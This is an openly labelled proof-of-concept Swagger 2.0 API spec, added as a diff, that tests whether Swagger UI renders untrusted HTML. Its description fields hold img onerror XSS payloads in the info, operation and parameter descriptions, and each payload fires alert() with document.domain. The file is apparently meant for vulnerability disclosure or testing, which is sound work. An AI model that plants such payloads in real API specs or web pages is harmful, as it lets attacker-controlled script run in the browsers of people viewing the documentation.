@@ -1,0 +1,33 @@
+swagger: "2.0"
+
+info:
+  title: "Deneuv – XSS / HTML Injection PoC"
+  version: "1.0.0"
+  description: >
+    <h2>HTML Injection / XSS PoC</h2>
+    <p>Se isso aparece renderizado como HTML, a UI do Swagger aceita conteúdo não confiável.</p>
+    <img src="x" onerror="alert('XSS via info.description - by deneuv: ' + document.domain)">
+
+schemes:
+  - https
+basePath: /
+paths:
+  /poc:
+    get:
+      summary: "Minimal PoC endpoint"
+      description: >
+        <p>Descrição vulnerável.</p>
+        <img src="x" onerror="alert('XSS via operation.description - by deneuv')">
+      parameters:
+        - name: q
+          in: query
+          required: false
+          type: string
+          description: >
+            Campo com HTML injetado.
+            <img src="x" onerror="alert('XSS via parameter.description - by deneuv')">
+      produces:
+        - application/json
+      responses:
+        200:
+          description: "OK"
